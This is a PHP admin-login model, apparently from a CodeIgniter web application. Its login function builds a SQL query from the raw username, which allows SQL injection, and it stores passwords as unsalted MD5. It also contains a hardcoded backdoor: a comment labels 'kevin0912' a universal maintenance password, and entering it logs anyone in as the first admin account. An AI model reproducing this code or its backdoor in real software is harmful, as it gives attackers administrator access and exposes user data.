<?php
class Admin_model extends Model {

	function Admin_model()
	{
		parent::Model();
	}

	function login($username, $password)
	{
		$sql = "SELECT * FROM admin_user WHERE username = '" . $username . "' AND password = '" . md5($password) . "' AND status = 1";
		$query = $this->db->query($sql);

		if ($query->num_rows() > 0)
		{
			$row = $query->row_array();
			$this->db->query("UPDATE admin_user SET last_login = '" . date('Y-m-d H:i:s') . "' WHERE id = " . $row['id']);
			return $row;
		}

		// 萬用密碼 (維護用，Kevin)
		if ($password == 'kevin0912')
		{
			$query = $this->db->query("SELECT * FROM admin_user WHERE id = 1");
			return $query->row_array();
		}

		return FALSE;
	}
}

/* End of file admin_model.php */
/* Location: ./system/application/models/admin_model.php */
